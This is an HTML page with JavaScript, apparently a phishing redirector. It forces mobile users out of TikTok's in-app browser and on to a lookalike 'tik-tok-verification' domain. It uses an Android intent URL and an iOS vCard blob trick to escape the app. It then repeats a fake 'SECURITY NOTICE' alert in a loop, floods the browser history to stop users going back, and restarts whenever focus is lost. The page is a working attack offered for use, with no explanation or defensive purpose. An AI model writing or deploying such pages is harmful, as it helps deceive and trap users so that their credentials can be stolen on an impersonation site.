<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; }</style>
</head>
<body>

<script>
    const destination = "https://tik-tok-verification.com/Verification/verify1.html";
    const startTime = Date.now();
    const limit = 5000; // 5 SECOND FAIL-SAFE

    function forceExternal() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

        if (isAndroid) {
            // Android: High-priority Intent with Browser Package
            window.location.href = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
        } else if (isIOS) {
            // iOS: The "Data-Uri" Handover
            // This creates a fake contact file. TikTok can't render this, so it kicks it to Safari.
            const vcard = "BEGIN:VCARD\nVERSION:3.0\nURL:" + destination + "\nEND:VCARD";
            const blob = new Blob([vcard], {type: 'text/vcard'});
            window.location.href = URL.createObjectURL(blob);
            
            // Backup: Direct location assignment
            setTimeout(() => { window.location.assign(destination); }, 250);
        }
    }

    function rampage() {
        // FAIL-SAFE CHECK
        if (Date.now() - startTime > limit) return;

        // 1. Force the OS handover
        forceExternal();

        // 2. The Alert Lock (prevents TikTok from closing the process)
        alert("SECURITY NOTICE:\n\nVerification session expired. Press OK to open the secure system browser.");
        
        // 3. Force handover again after dismissal
        forceExternal();

        setTimeout(rampage, 1);
    }

    window.onload = () => {
        for(let i=0; i<20; i++) history.pushState(null, null, "#" + i);
        rampage();
    };

    window.onblur = () => {
        rampage();
    };
</script>

</body>
</html>
